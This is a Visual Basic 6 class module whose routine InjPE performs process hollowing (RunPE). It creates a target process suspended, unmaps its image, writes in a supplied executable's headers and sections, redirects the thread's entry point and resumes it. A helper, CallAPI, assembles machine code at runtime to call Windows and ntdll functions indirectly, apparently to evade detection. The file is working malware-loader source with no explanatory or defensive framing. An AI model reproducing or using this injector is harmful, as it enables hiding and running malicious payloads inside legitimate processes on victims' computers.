VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "Class1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Private Declare Sub CopyBytes Lib "MSVBVM60" Alias "__vbaCopyBytes" (ByVal Sz As Long, Dest As Any, Source As Any)
Private Declare Function LoadLibraryA Lib "kernel32" (ByVal lpLibFileName As String) As Long
Private Declare Function CallWindowProcA Lib "user32" (ByVal addr As Long, ByVal p1 As Long, ByVal p2 As Long, ByVal p3 As Long, ByVal p4 As Long) As Long
Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long

Private Type SUI
    cb As Long
End Type

Private Type P_I
    hP As Long: hT As Long
End Type

Private Type F_S_A
    CW As Long: SW As Long: TW As Long: EO As Long: ES As Long: DO As Long: DS As Long: RA(1 To 80) As Byte: CNS As Long
End Type

Private Type CX
    CF As Long: D0 As Long: D1 As Long: D2 As Long: D3 As Long: D6 As Long: D7 As Long: FS As F_S_A: SGs As Long: SFs As Long: SEs As Long: SDs As Long: Edi As Long: Esi As Long: Ebx As Long: Edx As Long: Ecx As Long: Eax As Long: Ebp As Long: Eip As Long: SCs As Long: EFlags As Long: Esp As Long: SSs As Long
End Type

Private Type I_D_H
    e_ma As Integer: e_cb As Integer: e_cp As Integer: e_cr As Integer: e_cpa As Integer: e_min As Integer: e_max As Integer: e_ss As Integer: e_sp As Integer: e_cs As Integer: e_ip As Integer: e_csa As Integer: e_lf As Integer: e_ov As Integer: e_re(0 To 3) As Integer: e_oe As Integer: e_oe2 As Integer: e_re2(0 To 9) As Integer: e_lfn As Long
End Type

Private Type I_F_H
    MCH As Integer: NOS As Integer: TDS As Long: PTST As Long: NOS2 As Long: SOOH As Integer: chst As Integer
End Type

Private Type I_D_D
    VA As Long: Sz As Long
End Type

Private Type I_O_H
    M As Integer: MLV As Byte: MLV2 As Byte: SOC As Long: SOFD As Long: SOUD As Long: AOEP As Long: BOC As Long: BOD As Long: IB As Long: SA As Long: FA As Long: MOSV As Integer: MOSV2 As Integer: MIV As Integer: MIV2 As Integer: MSV As Integer: MSV2 As Integer: W32VV As Long: SOI As Long: SOH As Long: CS As Long: SS As Integer: D As Integer: SOSS As Long: SOSC As Long: SOHR As Long: SOHC As Long: LF As Long: NORAZ As Long: DD(0 To 15) As I_D_D
End Type

Private Type I_N_H
    s As Long: FH As I_F_H: OH As I_O_H
End Type

Private Type I_S_H
    SN As String * 8: VS As Long: VA As Long: SORD As Long: PTRD As Long: PTR As Long: PTL As Long: NOR As Integer: NOL As Integer: chst As Long
End Type

Private Function CallAPI(ByVal strLib As String, ByVal strMod As String, ParamArray Params()) As Long
    Dim lP                As Long
    Dim bvA(&HEC00& - 1)  As Byte
   
    lP = VarPtr(bvA(0))
   
    CopyBytes &H4, ByVal lP, &H59595958:                   lP = lP + 4
    CopyBytes &H2, ByVal lP, &H5059:                       lP = lP + 2
   
    For i = UBound(Params) To 0 Step -1
        CopyBytes &H1, ByVal lP, &H68:                     lP = lP + 1
        CopyBytes &H4, ByVal lP, CLng(Params(i)):          lP = lP + 4
    Next
   
    CopyBytes &H1, ByVal lP, &HE8:                         lP = lP + 1
    CopyBytes &H4, ByVal lP, GetProcAddress(LoadLibraryA(strLib), strMod) - lP - 4:                  lP = lP + 4
    CopyBytes &H1, ByVal lP, &HC3:                         lP = lP + 1
    CallAPI = CallWindowProcA(VarPtr(bvA(0)), 0, 0, 0, 0)
End Function

Sub InjPE(szProcessName As String, lpBuffer() As Byte)
    Dim Pidh As I_D_H
    Dim Pinh As I_N_H
    Dim Pish As I_S_H
    Dim Si As SUI
    Dim Pi As P_I
    Dim CTX As CX

    Si.cb = Len(Si)
    CTX.CF = &H10007

    Call CallAPI("kernel32", "RtlMoveMemory", VarPtr(Pidh), VarPtr(lpBuffer(0)), Len(Pidh))
    Call CallAPI("kernel32", "RtlMoveMemory", VarPtr(Pinh), VarPtr(lpBuffer(Pidh.e_lfn)), Len(Pinh))
    Call CallAPI("kernel32", "CreateProcessW", 0, StrPtr(szProcessName), 0, 0, 0, &H4, 0, 0, VarPtr(Si), VarPtr(Pi))

    Call CallAPI("ntdll", "NtUnmapViewOfSection", Pi.hP, Pinh.OH.IB)
    Call CallAPI("kernel32", "VirtualAllocEx", Pi.hP, Pinh.OH.IB, Pinh.OH.SOI, &H1000 Or &H2000, &H40)
    Call CallAPI("ntdll", "NtWriteVirtualMemory", Pi.hP, Pinh.OH.IB, VarPtr(lpBuffer(0)), Pinh.OH.SOH, 0)

    For i = 0 To Pinh.FH.NOS - 1
        CopyBytes Len(Pish), Pish, lpBuffer(Pidh.e_lfn + Len(Pinh) + Len(Pish) * i)
        Call CallAPI("ntdll", "NtWriteVirtualMemory", Pi.hP, Pinh.OH.IB + Pish.VA, VarPtr(lpBuffer(Pish.PTRD)), Pish.SORD, 0)
    Next

    Call CallAPI("ntdll", "NtGetContextThread", Pi.hT, VarPtr(CTX))
    Call CallAPI("ntdll", "NtWriteVirtualMemory", Pi.hP, CTX.Ebx + 8, VarPtr(Pinh.OH.IB), 4, 0)
    CTX.Eax = Pinh.OH.IB + Pinh.OH.AOEP
    Call CallAPI("ntdll", "NtSetContextThread", Pi.hT, VarPtr(CTX))
    Call CallAPI("ntdll", "NtResumeThread", Pi.hT, 0)
End Sub
